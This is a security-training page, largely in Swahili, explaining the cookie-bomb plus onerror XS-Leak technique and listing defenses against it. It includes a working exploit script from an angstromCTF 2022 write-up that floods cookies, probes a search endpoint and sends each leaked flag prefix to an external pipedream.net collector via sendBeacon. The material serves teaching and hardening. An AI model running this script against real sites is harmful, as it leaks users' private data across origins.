# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Mbinu hii inachanganya:
- Cookie bombing: kujaza browser ya victim na cookies nyingi/kubwa kwa target origin ili maombi yafuatayo yafike mipaka ya server/maombi (request header size, URL size in redirects, etc.).
- Error-event oracle: kujaribu cross-origin endpoint kwa <script> (au subresource nyingine) na kutofautisha hali kwa onload vs onerror.

High level idea
- Tafuta target endpoint ambayo tabia yake inatofautiana kwa hali mbili unazotaka kupima (kwa mfano, search “hit” vs “miss”).
- Hakikisha njia ya “hit” itasababisha redirect chain nzito au URL ndefu wakati njia ya “miss” inabaki fupi. Panua request headers kwa kutumia cookies nyingi ili njia ya “hit” pekee isababisha server kushindwa na HTTP error (mf., 431/414/400). Error hiyo inabadilisha onerror event na kuwa oracle kwa XS-Search.

When does this work
- Unaweza kusababisha victim browser kutuma cookies kwa target (mf., cookies ni SameSite=None au unaweza kuziweka katika first-party context kupitia popup window.open).
- Kuna app feature unaweza kutumia vibaya kuweka cookies za arbitrary (mf., “save preference” endpoints ambazo zinageuza controlled input names/values kuwa Set-Cookie) au kufanya post-auth redirects zinazojumuisha data inayoendeshwa na attacker kwenye URL.
- Server inatoa majibu tofauti kwa hali hizo mbili na, kwa headers/URL zilizoibuliwa, hali moja itavuka kikomo na kurudisha error response ambayo inachochea onerror.

Note on server errors used as the oracle
- 431 Request Header Fields Too Large mara nyingi hurudishwa wakati cookies zinapanua request headers; 414 URI Too Long au server-specific 400 inaweza kurudishwa kwa request targets ndefu. Moja wapo ya hizi husababisha subresource kushindwa kupakia na kusababisha onerror. [MDN documents 431 and typical causes like excessive cookies.]()

Practical example (angstromCTF 2022)
Skripti ifuatayo (kutoka public writeup) inatumia vibaya feature inayomruhusu attacker kuingiza cookies za arbitrary, kisha inaleta cross-origin search endpoint kama script. Wakati query ni sahihi, server inafanya redirect ambayo, pamoja na cookie bloat, inazidi mipaka ya server na kurudisha error status, kwa hivyo script.onerror inawaka; vinginevyo hakuna kinachotokea.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
Why the popup (window.open)?
- Vivinjari vya kisasa vinaanza kuziba third-party cookies. Kufungua top-level window kwa target kunafanya cookies kuwa first‑party, hivyo Set-Cookie responses kutoka kwa target zitabaki, kuwezesha hatua ya cookie-bomb hata kwa vikwazo vya third‑party cookies.

Generic probing helper
Iwapo tayari una njia ya kuweka cookies nyingi kwenye origin ya target (first-party), unaweza kutumia tena minimal oracle hii dhidi ya endpoint yoyote ambapo success/failure hupelekea matokeo tofauti ya mtandao (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Vidokezo vya kujenga oracle
- Lazimishe hali “positive” iwe nzito zaidi: chonga redirect ya ziada tu wakati predicate ni kweli, au fanya redirect URL ionyeshe input isiyozuilika ya mtumiaji ili ikue pamoja na kiambishi awali kinachokisiwa.
- Inflate headers: rudia cookie bombing hadi kosa linaloendelea laonekana kwenye njia “heavy”. Serveri kawaida zinazuia ukubwa wa header na zitaanguka mapema wakati cookies nyingi zipo.
- Stabilize: anzisha shughuli nyingi za kuweka cookie kwa sambamba na fanyia uchunguzi mara kwa mara ili kupunguza kelele ya muda na cache.

Related XS-Search tricks
- URL length based oracles (no cookies needed) zinaweza kuchanganywa au kutumika badala yake unapoweza kuamua lengo la ombi lenye urefu mkubwa:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Defenses and hardening
- Make success/failure responses indistinguishable:
- Epuka conditional redirects au tofauti kubwa katika ukubwa wa response kati ya states. Rejesha status ile ile, same content type, na urefu wa body unaofanana bila kujali state.
- Block cross-site subresource probes:
- SameSite cookies: weka sensitive cookies kwa SameSite=Lax au Strict ili subresource requests kama <script src> zisizibebe; pendelea Strict kwa auth tokens inapowezekana.
- Fetch Metadata: enforce Resource Isolation Policy kukataa cross-site subresource loads (mfano, if Sec-Fetch-Site != same-origin/same-site).
- Cross-Origin-Resource-Policy (CORP): weka CORP: same-origin (au angalau same-site) kwa endpoints zisizokusudiwa kuingizwa kama cross-origin subresources.
- X-Content-Type-Options: nosniff na weka Content-Type sahihi kwenye JSON/HTML endpoints ili kuepuka load-as-script quirks.
- Reduce header/URL amplification:
- Weka cap kwa idadi/ukubwa wa cookies zinazowekwa; sanitize vipengele vinavyowabadilisha arbitrary form fields kuwa Set-Cookie.
- Normalize au truncate reflected data katika redirects; epuka kuingiza attacker-controlled long strings katika Location URLs.
- Hifadhi server limits ziwe consistent na zishindwe kwa njia ile ile (epuka special error pages kwa tawi moja tu).

Maelezo
- Daraja hili la mashambulizi linajadiliwa kwa upana kama “Error Events” XS-Leaks. Hatua ya cookie-bomb ni njia rahisi ya kusukuma tawi moja tu kuzidi server limits, ikitoa reliable boolean oracle.



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
{{#include ../../banners/hacktricks-training.md}}
